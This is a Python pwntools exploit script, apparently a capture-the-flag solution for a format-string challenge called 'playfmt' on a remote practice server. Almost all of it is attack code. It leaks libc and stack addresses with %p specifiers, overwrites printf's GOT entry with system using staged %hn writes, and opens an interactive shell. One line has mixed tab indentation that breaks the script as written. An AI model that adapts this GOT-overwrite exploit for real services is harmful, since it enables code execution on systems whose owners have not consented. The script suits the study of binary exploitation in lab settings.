#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/17 10:53:56
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'i386'
if debug:
    if context.arch == "amd64":
        sh = process(['./playfmt'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so'})
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
    else:
	sh = process('./playfmt')
        libc = ELF('/lib/i386-linux-gnu/libc.so.6')
        # one_offset = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
else:
    IP = 'node4.buuoj.cn'
    port = 27331
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-32-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]

def debug():
    gdb.attach(sh,'b printf')
    pause()
elf = ELF('playfmt')
# debug()
printf_got = 0x0804A010
log.info("printf_got=>{}".format(hex(printf_got)))
sh.recvuntil("Magic echo Server\n=====================\n")
sh.sendline("%8$p-%6$p")
sh.recvuntil("0x")
IO_2_1_stdout = int(sh.recv(8),16)
sh.recvuntil("-0x")
stack_addr = int(sh.recv(8),16)
libc_base = IO_2_1_stdout - libc.symbols['_IO_2_1_stdout_']
log.info("libc_base=>{}".format(hex(libc_base)))
system_addr = libc_base + libc.symbols['system']
log.info("stack_addr=>{}".format(hex(stack_addr)))
offset_1 = stack_addr - 0xc #7
offset_2 = stack_addr - 0x4 #9
payload = '%' + str(offset_1 & 0xffff) + "c%6$hn"
sh.sendline(payload)
raw_input()
num_1 = printf_got & 0xffff
payload = '%' + str(num_1) + "c%10$hn"
sh.sendline(payload)
raw_input()
payload = '%' + str(offset_2 & 0xffff) + "c%6$hn"
sh.sendline(payload)
raw_input()
num_2 = (printf_got+2) & 0xffff
payload = '%' + str(num_2) + "c%10$hn"
sh.sendline(payload)
raw_input()
# debug()
num1 = system_addr&0xFFFF
num2 = (system_addr>>16)-num1
payload ='%' + str(num1) + 'c%7$hn%' + str(num2) + 'c%9$hn'
sh.sendline(payload)
raw_input()
sh.interactive()